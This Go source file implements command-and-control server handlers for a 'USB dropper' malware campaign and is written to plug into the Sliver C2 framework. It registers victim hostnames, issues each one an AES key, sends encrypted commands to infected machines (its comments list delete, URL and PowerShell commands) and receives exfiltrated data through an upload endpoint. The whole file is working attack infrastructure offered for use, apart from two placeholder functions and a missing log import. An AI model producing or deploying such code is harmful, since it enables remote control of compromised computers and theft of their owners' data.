// Sliver HTTP Listener Handlers for USB Dropper (Phase 2)
// Add to sliver/server/handlers/https.go or separate file

package handlers

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"sync"
)

var (
	targetKeys = make(map[string][]byte)
	keyMutex   = &sync.RWMutex{}
)

// HealthHandler - GET /health
func HealthHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

// RegisterHandler - POST /register?host=HOSTNAME
// Generate AES-256 key, store per hostname, return to client
func RegisterHandler(w http.ResponseWriter, r *http.Request) {
	hostname := r.URL.Query().Get("host")
	if hostname == "" {
		http.Error(w, "missing host parameter", http.StatusBadRequest)
		return
	}

	// Generate 256-bit AES key
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		http.Error(w, "key generation failed", http.StatusInternalServerError)
		return
	}

	// Store key per hostname
	keyMutex.Lock()
	targetKeys[hostname] = key
	keyMutex.Unlock()

	// Return key + metadata
	response := map[string]interface{}{
		"key":              base64.StdEncoding.EncodeToString(key),
		"method":           "aes",
		"backoff":          5,
		"commands_enabled": true,
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(response)

	// Log registration (indicator: new target callback)
	log.Printf("[+] Target registered: %s", hostname)
}

// CommandHandler - GET /command?host=HOSTNAME
// Fetch command from queue, encrypt with stored key
func CommandHandler(w http.ResponseWriter, r *http.Request) {
	hostname := r.URL.Query().Get("host")
	if hostname == "" {
		http.Error(w, "missing host parameter", http.StatusBadRequest)
		return
	}

	// Get encryption key
	keyMutex.RLock()
	key, exists := targetKeys[hostname]
	keyMutex.RUnlock()

	if !exists {
		// Unknown target; return empty (client will retry with /register)
		w.WriteHeader(http.StatusOK)
		return
	}

	// Fetch next command from queue (implement per your C2)
	cmd := getNextCommand(hostname)
	if cmd == "" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Encrypt using AES-256-GCM
	encrypted := encryptAESGCM(cmd, key)

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(encrypted))

	log.Printf("[*] Command sent to %s: %s", hostname, cmd)
}

// UploadHandler - POST /upload?host=HOSTNAME
// Receive exfiltrated data from target
func UploadHandler(w http.ResponseWriter, r *http.Request) {
	hostname := r.URL.Query().Get("host")
	if hostname == "" {
		http.Error(w, "missing host parameter", http.StatusBadRequest)
		return
	}

	// Read body (ZIP file or raw data)
	data, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read failed", http.StatusBadRequest)
		return
	}

	// Store exfiltrated data (implement per your C2)
	storeExfilData(hostname, data)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))

	log.Printf("[+] Exfil received from %s: %d bytes", hostname, len(data))
}

// Crypto helpers

func encryptAESGCM(plaintext string, key []byte) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}

	// Random 96-bit nonce
	nonce := make([]byte, aead.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return ""
	}

	// Encrypt
	ciphertext := aead.Seal(nonce, nonce, []byte(plaintext), nil)

	// Return base64(nonce + ciphertext)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

// Placeholder: implement per your C2 command queue
func getNextCommand(hostname string) string {
	// TODO: fetch from Sliver command queue
	// Return: "", "DELETE", "http://...", or PowerShell command
	return ""
}

// Placeholder: implement per your C2 storage
func storeExfilData(hostname string, data []byte) {
	// TODO: save to file, database, or S3
}

// Register handlers in HTTP listener
func RegisterDropperHandlers(mux *http.ServeMux) {
	mux.HandleFunc("/health", HealthHandler)
	mux.HandleFunc("/register", RegisterHandler)
	mux.HandleFunc("/command", CommandHandler)
	mux.HandleFunc("/upload", UploadHandler)
}
